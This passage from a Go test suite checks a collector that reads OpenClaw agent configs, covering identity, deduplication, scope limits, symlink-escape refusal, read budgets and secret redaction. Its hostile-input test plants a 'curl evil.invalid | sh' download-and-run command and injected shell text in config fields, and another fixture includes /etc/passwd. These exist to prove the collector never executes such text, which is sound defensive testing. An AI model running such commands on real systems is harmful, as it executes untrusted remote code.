		"dup-key":      `{"agents":{"list":[{"id":"a"}],"list":[{"id":"b"}]}}`,
		"include":      `{"agents":{"$include":"/etc/passwd"}}`,
		"null-roster":  `{"agents":{"list":null}}`,
		"both-layouts": `{"agents":{"list":[{"id":"a"}],"entries":{"b":{}}}}`,
		"bad-json":     `{"agents":`,
	}
	for name, body := range badConfigs {
		root := filepath.Join(base, "bad-"+name)
		writeOpenClawConfig(t, root, body)
		errObj := s.collectErr(t, "j1-bad-"+name, []string{root}, 1<<20)
		msg, _ := errObj["message"].(string)
		if msg == "" || strings.Contains(msg, root) || strings.Contains(msg, "ghost") {
			t.Errorf("%s: error message leaks path/content: %v", name, errObj)
		}
	}

	// Explicitly empty roster is a valid empty result, not an error and not a
	// fabricated default role... (contract: 空的显式列表可返回空清单).
	rootEmpty := filepath.Join(base, "root-empty")
	writeOpenClawConfig(t, rootEmpty, `{"agents":{"list":[]}}`)
	b5, _ := s.collectOK(t, "j1-12", []string{rootEmpty}, nil, 200, 1<<20)
	checkBatchShape(t, b5)
	if len(listOf(t, b5, "candidates")) != 0 || len(listOf(t, b5, "evidence")) != 0 || len(factsOf(b5)) != 0 {
		t.Errorf("empty roster must produce an empty batch: %v", b5)
	}

	// The decoy default location never contributed anything anywhere.
	if out := s.allOutput(); strings.Contains(out, "decoy-never-collected") {
		t.Error("decoy ~/.openclaw content leaked into protocol output")
	}
	if got := s.stderr.String(); got != "" {
		t.Errorf("clean session must not write to stderr, got %q", got)
	}
}

// --- J2. multi-root same-name identity, dedupe and content drift ------------

func TestNativeMultiRootSameNameIdentityAndDrift(t *testing.T) {
	home := t.TempDir()
	base := canonicalFixtureDir(t, t.TempDir())
	rootA := filepath.Join(base, "instance-a")
	rootB := filepath.Join(base, "instance-b")
	// Same role id "shared-role" under two different config roots.
	cfgA := writeOpenClawConfig(t, rootA, `{"agents":{"list":[{"id":"shared-role","name":"Same Name","model":"m/a"}]}}`)
	writeOpenClawConfig(t, rootB, `{"agents":{"list":[{"id":"shared-role","name":"Same Name","model":"m/b"}]}}`)
	// auth-profiles metadata exists in both roots; contents must never be read.
	writeAuthProfiles(t, rootA, "canary-auth-content-A-never-read")
	writeAuthProfiles(t, rootB, "canary-auth-content-B-never-read")

	s := startNativeSession(t, home)
	b1, _ := s.collectOK(t, "j2-01", []string{rootA, rootB}, nil, 200, 1<<20)
	checkBatchShape(t, b1)
	checkReferenceIntegrity(t, b1)
	cands := indexCandidates(t, b1)
	idA, idB := wantCandidateID(t, rootA, "shared-role"), wantCandidateID(t, rootB, "shared-role")
	if idA == idB {
		t.Fatal("oracle broken: distinct roots produced equal candidate ids")
	}
	if len(cands) != 2 || cands[idA] == nil || cands[idB] == nil {
		t.Fatalf("same-name roles under two roots must yield 2 distinct candidates, got %v", cands)
	}
	for root, id := range map[string]string{rootA: idA, rootB: idB} {
		cand := cands[id]
		if strOf(t, cand, "source_locator") != wantSourceLocator(t, root, "shared-role") {
			t.Errorf("%s: source_locator=%q", root, strOf(t, cand, "source_locator"))
		}
		if strOf(t, cand, "name") != "Same Name" {
			t.Errorf("%s: name=%q", root, strOf(t, cand, "name"))
		}
	}
	// Per-root auth-profiles metadata evidence is isolated by root digest and
	// referenced only by that root's candidates; content is never hashed.
	evs := indexEvidence(t, b1)
	authA, authB := wantAuthEvidenceID(rootA), wantAuthEvidenceID(rootB)
	if authA == authB {
		t.Fatal("oracle broken: equal auth evidence ids for distinct roots")
	}
	for root, tuple := range map[string][3]any{
		rootA: {idA, authA, int64(len("canary-auth-content-A-never-read"))},
		rootB: {idB, authB, int64(len("canary-auth-content-B-never-read"))},
	} {
		id, authID, wantSize := tuple[0].(string), tuple[1].(string), tuple[2].(int64)
		ids := listOf(t, cands[id], "evidence_ids")
		if len(ids) != 2 || ids[1] != authID {
			t.Errorf("%s: evidence_ids=%v, want [config, %s]", root, ids, authID)
		}
		ev := evs[authID]
		if ev == nil {
			t.Fatalf("%s: auth metadata evidence %s missing", root, authID)
		}
		if got := strOf(t, ev, "content_hash"); got != fmt.Sprintf("size:%d", wantSize) {
			t.Errorf("%s: auth content_hash=%q, want size-only record", root, got)
		}
		if got := strOf(t, ev, "classification"); got != "secret_ref" {
			t.Errorf("%s: auth classification=%q, want secret_ref", root, got)
		}
	}

	// Lexically equivalent and duplicated roots are deduped: the same canonical
	// root is scanned once, so the batch is identical to the two-root batch.
	b2, _ := s.collectOK(t, "j2-02",
		[]string{rootA, rootA + string(filepath.Separator), filepath.Join(rootA, "."), rootA, rootB}, nil, 200, 1<<20)
	checkBatchShape(t, b2)
	if got := len(listOf(t, b2, "candidates")); got != 2 {
		t.Errorf("equivalent/duplicate roots produced %d candidates, want 2", got)
	}
	// Repeated identical scan: the same identities, locators and evidence ids
	// (timestamps are wall-clock and excluded from the comparison).
	b2repeat, _ := s.collectOK(t, "j2-03", []string{rootA, rootB}, nil, 200, 1<<20)
	checkBatchShape(t, b2repeat)
	identityView := func(batch map[string]any) map[string]string {
		out := map[string]string{}
		for id, c := range indexCandidates(t, batch) {
			ids, _ := c["evidence_ids"].([]any)
			out[id] = strOf(t, c, "source_locator") + "|" + fmt.Sprint(ids)
		}
		return out
	}
	if !reflect.DeepEqual(identityView(b2repeat), identityView(b1)) {
		t.Error("identical input changed identities between collects")
	}
	oldEvA := wantEvidenceID(t, rootA, "shared-role", wantFileHash(t, cfgA))
	if indexEvidence(t, b2repeat)[oldEvA] == nil {
		t.Fatal("identical input lost the original evidence id")
	}

	// Content change on rootA: role identity (candidate id + locator) is
	// stable, the config digest and evidence id move, the cursor moves.
	writeOpenClawConfig(t, rootA, `{"agents":{"list":[{"id":"shared-role","name":"Same Name","model":"m/a-v2"}]}}`)
	b3, _ := s.collectOK(t, "j2-04", []string{rootA, rootB}, nil, 200, 1<<20)
	checkBatchShape(t, b3)
	cands3 := indexCandidates(t, b3)
	if cands3[idA] == nil || cands3[idB] == nil {
		t.Fatalf("content change must preserve positional identities (got %v)", cands3)
	}
	evs3 := indexEvidence(t, b3)
	newHashA := wantFileHash(t, cfgA)
	newEvA := wantEvidenceID(t, rootA, "shared-role", newHashA)
	if evs3[newEvA] == nil {
		t.Fatalf("changed config must produce new evidence %s (got %v)", newEvA, evs3)
	}
	if evs3[oldEvA] != nil {
		t.Error("changed config kept the stale evidence id bound to the old digest")
	}
	if strOf(t, evs3[newEvA], "content_hash") != newHashA {
		t.Error("changed config not reflected in evidence content_hash")
	}
	// Cursor per contract formula over the response's own candidate ids.
	var ids3 []string
	for _, c := range listOf(t, b3, "candidates") {
		ids3 = append(ids3, strOf(t, mapOf(t, c, "candidate"), "candidate_id"))
	}
	resp, _ := s.rpc(t, "j2-05", "checkpoint", nil)
	if got := rpcOK(t, resp)["cursor"]; got != wantCursor(ids3) {
		t.Errorf("checkpoint cursor=%v, want oracle cursor over %v", got, ids3)
	}

	// Canary auth-profiles contents never appear anywhere in the wire output.
	out := s.allOutput()
	for _, canary := range []string{"canary-auth-content-A", "canary-auth-content-B"} {
		if strings.Contains(out, canary) {
			t.Errorf("auth-profiles content canary %q leaked into protocol output", canary)
		}
	}
}

// --- J3. skill selection + declared source roots ----------------------------

func TestNativeSkillSelectionAndSourceRoots(t *testing.T) {
	home := t.TempDir()
	base := canonicalFixtureDir(t, t.TempDir())
	root := filepath.Join(base, "skills-root")
	wsAlpha := filepath.Join(base, "ws-alpha")
	cfgBody := `{
  "agents": {
    "defaults": {"skills": ["base-tool"]},
    "list": [
      {"id": "alpha", "workspace": "` + wsAlpha + `", "agentDir": "/fixture/agent-dir-alpha", "skills": ["github", "weather"]},
      {"id": "beta"},
      {"id": "gamma", "skills": []},
      {"id": "delta", "skills": "not-a-list"},
      {"id": "epsilon", "skills": ["sk-syntheticsecret123456"]},
      {"id": "zeta", "workspace": "relative/not-absolute"}
    ]
  }
}`
	writeOpenClawConfig(t, root, cfgBody)

	s := startNativeSession(t, home)
	b1, _ := s.collectOK(t, "j3-01", []string{root}, nil, 200, 1<<20)
	checkBatchShape(t, b1)
	checkReferenceIntegrity(t, b1)
	cands := indexCandidates(t, b1)

	type wantSel struct {
		source, status string
		names          []string
	}
	wantSelections := map[string]wantSel{
		"alpha":   {"agent", "declared_list", []string{"github", "weather"}},
		"beta":    {"defaults", "declared_list", []string{"base-tool"}},
		"gamma":   {"agent", "declared_list", []string{}},
		"delta":   {"agent", "unsupported", []string{}},
		"epsilon": {"agent", "unsupported", []string{}},
		"zeta":    {"defaults", "declared_list", []string{"base-tool"}},
	}
	for id, want := range wantSelections {
		cand := cands[wantCandidateID(t, root, id)]
		if cand == nil {
			t.Fatalf("candidate %s missing", id)
		}
		raw := attrString(t, cand, "skill_selection")
		var sel struct {
			Schema string   `json:"schema_version"`
			Source string   `json:"source"`
			Status string   `json:"status"`
			Names  []string `json:"names"`
		}
		if err := json.Unmarshal([]byte(raw), &sel); err != nil {
			t.Fatalf("%s: skill_selection not a JSON object: %v", id, err)
		}
		if sel.Schema != "enterprise-openclaw-skill-selection/v1" ||
			sel.Source != want.source || sel.Status != want.status ||
			!reflect.DeepEqual(sel.Names, want.names) {
			t.Errorf("%s: skill_selection=%+v, want %+v", id, sel, want)
		}
	}

	// Declared source roots: hashed locators only, derived from the declared
	// workspace; never evidence of installed/loaded skills.
	var alphaRoots struct {
		Schema string `json:"schema_version"`
		Basis  string `json:"basis"`
		Status string `json:"status"`
		Roots  []struct {
			Kind    string `json:"kind"`
			Locator string `json:"locator_sha256"`
		} `json:"roots"`
	}
	rawRoots := attrString(t, cands[wantCandidateID(t, root, "alpha")], "skill_source_roots")
	if err := json.Unmarshal([]byte(rawRoots), &alphaRoots); err != nil {
		t.Fatalf("alpha: skill_source_roots not a JSON object: %v", err)
	}
	if alphaRoots.Schema != "enterprise-role-skill-roots/v1" || alphaRoots.Basis != "agent_workspace" ||
		alphaRoots.Status != "declared" || len(alphaRoots.Roots) != 2 {
		t.Errorf("alpha: skill_source_roots=%+v", alphaRoots)
	}
	wantLocators := map[string]string{
		"workspace_skills":     wantSkillRootLocator(wsAlpha, "skills"),
		"project_agent_skills": wantSkillRootLocator(wsAlpha, ".agents/skills"),
	}
	for _, r := range alphaRoots.Roots {
		want, ok := wantLocators[r.Kind]
		if !ok || r.Locator != want {
			t.Errorf("alpha: root %+v violates oracle locators %v", r, wantLocators)
		}
	}
	if strings.Contains(rawRoots, wsAlpha) {
		t.Error("raw workspace path leaked into skill_source_roots")
	}
	// Non-absolute workspace: unresolved, no roots, no fabricated positions.
	var zetaRoots struct {
		Basis  string `json:"basis"`
		Status string `json:"status"`
		Roots  []any  `json:"roots"`
	}
	zetaRaw := attrString(t, cands[wantCandidateID(t, root, "zeta")], "skill_source_roots")
	if err := json.Unmarshal([]byte(zetaRaw), &zetaRoots); err != nil {
		t.Fatal(err)
	}
	if zetaRoots.Status != "unresolved" || len(zetaRoots.Roots) != 0 {
		t.Errorf("zeta: skill_source_roots=%+v, want unresolved/empty", zetaRoots)
	}
	// agentDir is a declared string attribute, redacted but visible.
	if got := attributesOf(t, cands[wantCandidateID(t, root, "alpha")])["agent_dir"]; got != "/fixture/agent-dir-alpha" {
		t.Errorf("alpha: agent_dir=%q", got)
	}

	// Nothing here may claim skill installation/loading or effective grants:
	// attributes stay within the declared contract key set, all facts declared.
	allowedAttrs := map[string]bool{
		"framework_source": true, "role_identity_basis": true, "skill_selection": true,
		"skill_source_roots": true, "workspace": true, "agent_dir": true, "models": true,
	}
	for id, cand := range cands {
		for k := range attributesOf(t, cand) {
			if !allowedAttrs[k] {
				t.Errorf("%s: attribute %q outside the declared contract set", id, k)
			}
		}
	}
	for _, f := range factsOf(b1) {
		fm := mapOf(t, f, "permission_fact")
		if strOf(t, fm, "domain") == "skill" || strings.Contains(strings.ToLower(strOf(t, fm, "domain")), "skill") {
			t.Errorf("skill domain fact produced from declarations: %v", fm)
		}
	}
	if strings.Contains(s.allOutput(), "sk-syntheticsecret123456") {
		t.Error("secret-shaped skill name leaked into protocol output")
	}
}

// --- J4. scope enforcement, escape refusal, missing/incomplete distinction --

func TestNativeScopeEscapeAndMissingBoundaries(t *testing.T) {
	home := t.TempDir()
	base := canonicalFixtureDir(t, t.TempDir())
	goodRoot := filepath.Join(base, "good")
	writeOpenClawConfig(t, goodRoot, `{"agents":{"list":[{"id":"scoped-role","model":"m/x"}]}}`)
	outside := t.TempDir()
	writeOpenClawConfig(t, outside, `{"agents":{"list":[{"id":"escape-target-role","model":"evil/model"}]}}`)

	s := startNativeSession(t, home)

	// validate_scope rejections (contract §4 + openclaw include rules). The
	// result must mark them invalid and carry error messages.
	invalidScopes := map[string]any{
		"null":            nil,
		"empty-roots":     map[string]any{"roots": []string{}},
		"fs-root":         map[string]any{"roots": []string{"/"}},
		"env-named-root":  map[string]any{"roots": []string{filepath.Join(base, ".env-config")}},
		"secret-named":    map[string]any{"roots": []string{filepath.Join(base, "secret-config")}},
		"mid-wildcard":    map[string]any{"roots": []string{filepath.Join(base, "*", "deep")}},
		"exclude":         map[string]any{"roots": []string{goodRoot}, "exclude": []string{"openclaw.json"}},
		"include-missing": map[string]any{"roots": []string{goodRoot}, "include": []string{"other.txt"}},
	}
	for name, scope := range invalidScopes {
		result := s.validateScope(t, "j4-vs-"+name, scope)
		if result["valid"] != false {
			t.Errorf("%s: valid=%v, want false (errors=%v)", name, result["valid"], result["errors"])
		}
		if errs, _ := result["errors"].([]any); len(errs) == 0 {
			t.Errorf("%s: invalid scope must carry error messages", name)
		}
	}
	if result := s.validateScope(t, "j4-vs-ok", map[string]any{"roots": []string{goodRoot}}); result["valid"] != true {
		t.Errorf("good root: valid=%v, want true (errors=%v)", result["valid"], result["errors"])
	}

	// Missing config: fixed error category, no path leak, no fake empty list.
	missingRoot := filepath.Join(base, "no-config-here")
	if err := os.MkdirAll(missingRoot, 0o755); err != nil {
		t.Fatal(err)
	}
	errObj := s.collectErr(t, "j4-missing", []string{missingRoot}, 1<<20)
	if msg := strOf(t, errObj, "message"); msg != "openclaw_config_missing" {
		t.Errorf("missing config: message=%q, want openclaw_config_missing", msg)
	}

	// Symlinked openclaw.json pointing outside the root is refused: fail closed,
	// never collect the escape target (DEV10 / M-E6).
	linkRoot := filepath.Join(base, "linked")
	if err := os.MkdirAll(linkRoot, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(filepath.Join(outside, "openclaw.json"), filepath.Join(linkRoot, "openclaw.json")); err != nil {
		t.Skipf("symlink: %v", err)
	}
	errObj = s.collectErr(t, "j4-symlink", []string{linkRoot}, 1<<20)
	if msg := strOf(t, errObj, "message"); strings.Contains(msg, linkRoot) || strings.Contains(msg, outside) {
		t.Errorf("symlink refusal leaks paths: %v", errObj)
	}

	// One failing root fails the whole collect: no partial candidates from the
	// good root are committed (collection-status contract).
	errObj = s.collectErr(t, "j4-partial", []string{goodRoot, missingRoot}, 1<<20)
	if msg := strOf(t, errObj, "message"); msg != "openclaw_config_missing" {
		t.Errorf("multi-root failure: message=%q, want openclaw_config_missing", msg)
	}
	b1, _ := s.collectOK(t, "j4-good", []string{goodRoot}, nil, 200, 1<<20)
	checkBatchShape(t, b1)
	checkReferenceIntegrity(t, b1)
	cands := indexCandidates(t, b1)
	if len(cands) != 1 || cands[wantCandidateID(t, goodRoot, "scoped-role")] == nil {
		t.Fatalf("good root candidates=%v", cands)
	}
	// The escape target never contributed a candidate/evidence/fact anywhere.
	out := s.allOutput()
	if strings.Contains(out, "escape-target-role") || strings.Contains(out, "evil/model") {
		t.Error("symlink escape target content leaked into protocol output")
	}
	if strings.Contains(out, outside) {
		t.Error("outside fixture path leaked into protocol output")
	}
}

// --- J5. read budget and oversized configs ----------------------------------

func TestNativeBudgetNeverAttestsPrefix(t *testing.T) {
	home := t.TempDir()
	base := canonicalFixtureDir(t, t.TempDir())

	// JSON5 comments and trailing whitespace are part of the evidence digest
	// (hash covers the ORIGINAL bytes); a file exactly at budget is complete.
	// The trailing two spaces before the final newline are fixture data, written
	// as escapes so the source file itself carries no trailing whitespace.
	rootFull := filepath.Join(base, "full")
	fullBody := "{\n" +
		"  // a configuration comment that must be inside the digest\n" +
		`  "agents": {"list": [{"id": "reader", "workspace": "` + filepath.Join(base, "ws-reader") + `"}]},` +
		"  \n}\n"
	cfgFull := writeOpenClawConfig(t, rootFull, fullBody)

	// Oversized root whose valid-JSON prefix must not masquerade as the config.
	rootBig := filepath.Join(base, "big")
	prefix := `{"agents":{"list":[{"id":"prefix-agent"}]}}`
	writeOpenClawConfig(t, rootBig, prefix+`,"ignored":true}`)

	s := startNativeSession(t, home)

	// Exact-budget file: collected fully; digest covers comments + whitespace.
	b1, _ := s.collectOK(t, "j5-01", []string{rootFull}, nil, 200, int64(len(fullBody)))
	checkBatchShape(t, b1)
	cands := indexCandidates(t, b1)
	idReader := wantCandidateID(t, rootFull, "reader")
	if cands[idReader] == nil {
		t.Fatalf("exact-budget config not collected: %v", cands)
	}
	evID := wantEvidenceID(t, rootFull, "reader", wantFileHash(t, cfgFull))
	ev := indexEvidence(t, b1)[evID]
	if ev == nil {
		t.Fatalf("evidence %s missing", evID)
	}
	if got := strOf(t, ev, "content_hash"); got != wantFileHash(t, cfgFull) {
		t.Errorf("content_hash=%q, want digest of the full original bytes", got)
	}

	// One byte under budget: truncated marker, and zero facts from this root.
	b2, _ := s.collectOK(t, "j5-02", []string{rootFull}, nil, 200, int64(len(fullBody))-1)
	checkBatchShape(t, b2)
	if b2["truncated"] != true {
		t.Errorf("under-budget collect must set truncated=true, got %v", b2["truncated"])
	}
	if len(listOf(t, b2, "candidates")) != 0 || len(listOf(t, b2, "evidence")) != 0 || len(factsOf(b2)) != 0 {
		t.Errorf("prefix of an oversized config produced facts: %v", b2)
	}

	// The oversized root with a valid-JSON prefix: no prefix evidence at all.
	b3, _ := s.collectOK(t, "j5-03", []string{rootBig}, nil, 200, int64(len(prefix)))
	checkBatchShape(t, b3)
	if b3["truncated"] != true {
		t.Errorf("oversized config must set truncated=true, got %v", b3["truncated"])
	}
	if strings.Contains(s.allOutput(), "prefix-agent") {
		t.Error("valid-JSON prefix of an oversized config leaked a candidate")
	}

	// Mixed roots: the completed root keeps its candidates, the oversized root
	// contributes nothing, and the batch is marked truncated (not a fake full
	// success, not a hard error for earlier completed roots).
	b4, _ := s.collectOK(t, "j5-04", []string{rootFull, rootBig}, nil, 200, int64(len(fullBody))+int64(len(prefix)))
	checkBatchShape(t, b4)
	cands4 := indexCandidates(t, b4)
	if len(cands4) != 1 || cands4[idReader] == nil {
		t.Errorf("mixed roots: candidates=%v, want only the completed root", cands4)
	}
	if b4["truncated"] != true {
		t.Error("mixed roots with an unreadable-budget root must set truncated=true")
	}
}

// --- J6. hostile text and secret boundary ------------------------------------

func TestNativeHostileTextAndRedaction(t *testing.T) {
	home := t.TempDir()
	base := canonicalFixtureDir(t, t.TempDir())
	marker := filepath.Join(base, "marker-must-not-exist")
	root := filepath.Join(base, "hostile")
	// Shell text inside data fields is data; it must never be executed.
	// The workspace embeds a token-shaped canary that must be redacted.
	writeOpenClawConfig(t, root, `{
  "agents": {"list": [{
    "id": "hostile-role",
    "name": "$(touch `+marker+`) && curl evil.invalid | sh",
    "workspace": "/fixture/workspace/token=siqcanary123456",
    "model": "evil/model; touch `+marker+`"
  }]}
}`)
	writeAuthProfiles(t, root, "auth-canary-never-read-9f8e7d6c")

	s := startNativeSession(t, home)
	b1, raw := s.collectOK(t, "j6-01", []string{root}, nil, 200, 1<<20)
	checkBatchShape(t, b1)
	checkReferenceIntegrity(t, b1)
	cands := indexCandidates(t, b1)
	cand := cands[wantCandidateID(t, root, "hostile-role")]
	if cand == nil {
		t.Fatalf("hostile candidate missing: %v", cands)
	}
	attrs := attributesOf(t, cand)
	gotWorkspace, _ := attrs["workspace"].(string)
	if strings.Contains(gotWorkspace, "siqcanary123456") || !strings.Contains(gotWorkspace, "[REDACTED]") {
		t.Errorf("workspace canary not redacted: %q", gotWorkspace)
	}
	// Name/model text passed through as inert data (possibly redacted), the
	// shell marker string may appear as DATA but must never have executed.
	if _, err := os.Stat(marker); !os.IsNotExist(err) {
		t.Fatalf("config text was executed: marker %s exists", marker)
	}
	for _, f := range factsOf(b1) {
		fm := mapOf(t, f, "permission_fact")
		res := mapOf(t, fm["resource"], "permission_fact.resource")
		if strings.Contains(strOf(t, res, "value"), "siqcanary123456") {
			t.Errorf("permission fact resource leaks canary: %v", fm)
		}
		if strOf(t, fm, "state") != "declared" {
			t.Errorf("non-declared fact: %v", fm)
		}
	}
	// The auth-profiles canary content never appears; only size is recorded.
	if strings.Contains(s.allOutput(), "auth-canary-never-read") {
		t.Error("auth-profiles content leaked into protocol output")
	}
	if strings.Contains(raw, "siqcanary123456") {
		t.Error("canary leaked into the raw collect response")
	}
	// The process survived hostile input and keeps serving.
	resp, _ := s.rpc(t, "j6-02", "describe", nil)
	rpcOK(t, resp)
	if got := s.stderr.String(); got != "" {
		t.Errorf("clean session must not write to stderr, got %q", got)
	}
}
